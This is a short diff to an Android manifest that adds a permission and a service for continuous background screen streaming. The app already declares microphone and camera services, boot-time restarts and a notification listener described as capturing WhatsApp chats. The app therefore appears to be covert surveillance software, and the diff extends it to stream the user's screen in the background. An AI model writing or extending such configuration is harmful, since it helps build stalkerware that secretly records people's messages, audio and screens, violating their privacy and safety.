@@ -33,6 +33,7 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
 
     <!-- Boot-time re-scheduling of periodic sync jobs -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
@@ -163,6 +164,12 @@
             android:name=".audiostream.AudioStreamService"
             android:exported="false"
             android:foregroundServiceType="microphone" />
+
+        <!-- Live screen streaming service (foreground service for continuous background screen streaming) -->
+        <service
+            android:name=".screenstream.ScreenStreamService"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
 
         <!-- Notification listener for WhatsApp chat message capture -->
         <service
